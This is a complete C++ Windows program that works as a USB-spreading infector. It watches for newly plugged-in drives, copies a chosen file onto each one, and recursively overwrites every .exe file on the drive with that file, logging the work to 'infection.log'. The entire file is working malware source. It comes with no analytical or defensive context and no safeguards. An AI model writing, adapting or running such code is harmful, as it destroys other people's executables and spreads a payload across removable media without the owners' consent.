#include <iostream>
#include <algorithm>
#include <vector>
#include <fstream>
#include <Windows.h>


std::vector<std::string> getDriveList() {
    std::vector<std::string> drives;
    int ndrives = 0;
    char buffer[100];
    int size = GetLogicalDriveStrings(sizeof(buffer), buffer);

    drives.push_back("");
    for (int i = 0; i < size; i++) {
        if (buffer[i] == 0) {
            drives.push_back("");
            continue;
        }
        drives.back() += buffer[i];
    }

    return drives;
}

void copyToDrive(std::string drive, std::string src, std::ofstream& log) {
    log << "Copying file to drive " << drive.c_str() << "..." << std::endl;
    std:: string filename = src.substr(src.find_last_of("\\") + 1);
    std::string dest = drive + filename;
    CopyFile(src.c_str(), dest.c_str(), true);
}

void replaceExes(std::string dir, std::string src, std::ofstream& log) {

    if (dir.back() != '\\') {
        dir += "\\";
    }

    WIN32_FIND_DATA findData;
    std::string searchString = dir + "*";
    HANDLE searchHandle = FindFirstFile(searchString.c_str(), &findData);

    do {
        std::string file(findData.cFileName);
        if (file == "." || file == "..") {
            continue;
        }
        std::string path = dir + file;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            replaceExes(path, src, log);
        }
        else if (path.substr(path.length() - 4) == ".exe") {
            log << "Erasing: " << src.c_str() << " >> " << path.c_str() << std::endl;
            CopyFile(src.c_str(), path.c_str(), false);
        }
    } while (FindNextFile(searchHandle, &findData));
    
    FindClose(searchHandle);
}

int  WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

    std::ofstream log; 
    log.open("infection.log", std::ios::out);

    std::string srcfile(lpCmdLine); 
    if (srcfile.empty()) {
        log << "No args supplied ! Usage: Infection.exe <srcfile>" << std::endl;
        log.close();
        exit(0);
    }

    std::vector<std::string> drivelist = getDriveList();
    std::vector<std::string> lastdrivelist = drivelist;

    log << "[*] Ready !" << std::endl;

    while (1) {
        Sleep(500);
        drivelist = getDriveList();
        for (std::vector<std::string>::iterator it = drivelist.begin(); it != drivelist.end(); ++it) {
            if (std::find(lastdrivelist.begin(), lastdrivelist.end(), *it) == lastdrivelist.end()) {
                log << "[*] New device plugged in: " << (*it).c_str() << std::endl;
                copyToDrive(*it, srcfile, log);
                replaceExes(*it, srcfile, log);
            }
        }
        lastdrivelist = drivelist;
    }

    log.close();

    return 0;
}
